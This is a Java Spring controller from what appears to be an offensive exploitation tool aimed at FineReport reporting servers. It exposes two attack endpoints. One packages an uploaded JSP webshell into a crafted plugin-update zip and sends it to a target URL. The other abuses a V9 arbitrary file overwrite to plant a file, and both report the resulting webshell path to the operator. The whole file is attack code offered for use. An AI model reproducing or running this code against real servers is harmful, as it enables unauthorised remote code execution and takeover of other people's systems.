package com.droplab.Controller.FineReport;

import com.droplab.Controller.FineReport.Service.V8FileUploadTwo;
import com.droplab.Controller.FineReport.Service.V9FileOverWrite;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.FileZipUtils;
import com.droplab.Utils.InfoUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

/**
 * 帆软报表漏洞
 */
@Controller
@RequestMapping("/finereport")
public class FineReportController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "FineReport/index.html";
    }


    /**
     * 插件更新上传webshell
     * @param model
     * @param files
     * @param url
     * @param depth
     * @param platform
     * @return
     */
    @RequestMapping(value = "/V8GETSHELLTWO", method = RequestMethod.POST)
    public String V8GETSHELLTWO(Model model,
                                @RequestParam(value = "files", required = true) List<MultipartFile> files,
                                @RequestParam(value = "url", required = true) String url,
                                @RequestParam(value = "depth", required = false, defaultValue = "2") String depth,
                                @RequestParam(value = "platform", required = false, defaultValue = "windows") String platform) {
        try {
            int depthFile = 4;
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.RandomStr(8);
            hashMap.put("url", url);
            if (!depth.equals("") && depth != null) {
                depthFile = Integer.parseInt(depth);
            }
            if (!files.isEmpty()) {
                HashMap<String, String> fileMap = new HashMap<>();
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".jsp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            fileMap.put(rootPath, "");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                Path pngPath = Files.write(new File(System.getProperty("java.io.tmpdir") + "//login.png").toPath(), Base64.getDecoder().decode(InfoUtils.base64Png));
                fileMap.put(pngPath.toAbsolutePath().toString(), "");
                /**
                 * 创建压缩包
                 */
                FileZipUtils fileZipUtils = new FileZipUtils(depthFile, platform);
                File zip = fileZipUtils.createZip(fileMap, System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".png");
                hashMap.put("filepath", zip.getAbsolutePath());

                /**
                 * 开始攻击
                 */
                V8FileUploadTwo v8FileUploadTwo = (V8FileUploadTwo) Class.forName(getMap().get("V8GETSHELLTWO")).newInstance();
                v8FileUploadTwo.setParams(hashMap);
                Connection.Response response = v8FileUploadTwo.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("V8GETSHELLTWOurl", url);
                    modelMap.put("V8GETSHELLTWO", new String(response.bodyAsBytes()));
                    modelMap.put("V8GETSHELLTWOtips", String.format("如果写入成功，webshell路径：%s/WebReport/%s.jsp", url, filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "FineReport/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("V8GETSHELLTWOurl", url);
        modelMap.put("V8GETSHELLTWO", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";

    }


    /**
     * 帆软V9任意文件覆盖getshell
     * @return
     */
    @RequestMapping(value = "/V9FileOverWrite", method = RequestMethod.POST)
    public String V9GETSHELLRCE(Model model,
                                @RequestParam(value = "files",required = true)List<MultipartFile> files,
                                @RequestParam(value = "url",required = true) String url,
                                @RequestParam(value = "overFile",required = true) String overFile){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("overFile",overFile);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.RandomStr(8) + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                V9FileOverWrite v9FileOverWrite =(V9FileOverWrite) Class.forName(getMap().get("V9FileOverWrite")).newInstance();
                v9FileOverWrite.setParams(hashMap);
                Connection.Response response = v9FileOverWrite.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("V9FileOverWriteurl", url);
                    modelMap.put("V9FileOverWrite", new String(response.bodyAsBytes()));
                    modelMap.put("V9FileOverWritetips", String.format("如果写入成功，webshell路径：%s/WebReport/%s", url, overFile));
                    CommonUtils.modelSet(modelMap, model);
                    return "FineReport/index.html";
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("V9FileOverWriteurl", url);
        modelMap.put("V9FileOverWrite", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "FineReport/index.html";

    }



    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("V8GETSHELLTWO", "com.droplab.Controller.FineReport.Service.V8FileUploadTwo");
        hashMap.put("V9FileOverWrite", "com.droplab.Controller.FineReport.Service.V9FileOverWrite");
        return hashMap;
    }
}
